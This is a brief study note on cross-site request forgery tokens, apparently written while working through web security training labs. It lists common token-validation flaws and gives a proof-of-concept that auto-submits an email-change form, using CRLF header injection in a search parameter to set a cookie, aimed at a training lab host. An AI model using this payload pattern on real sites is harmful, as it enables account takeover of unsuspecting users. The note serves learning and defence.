# CSRF token

Typically included as a hidden param in HTML form

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Flaws in CSRF Tokens

- Validate on POST but skip on GET
- Validate when token is present, but skip if omitted
- Token not tied to session. Attacker can generate a token with another session
- Token tied to a non-session cookie (tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions)

## Example of tied to a non-session cookie
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<form action="https://0ad400a20453042a80540d73000a0044.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wiener2&#64;normal&#45;user&#46;net" />
      <input type="hidden" name="csrf" value="SKrA9MNdnkqrUeiIloVj6REBvpbAfyGB" />
      <input type="submit" value="Submit request" />
    </form>
  <img src="https://0ad400a20453042a80540d73000a0044.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=FXupWAVwmYF5UOcNGElWrqPkuprHpSPM%3b%20SameSite=None" onerror="document.forms[0].submit()">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

- CSRF token is simply duplicated in a cookie. Needs first to set the cookie before CSRF (like in previous example).

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
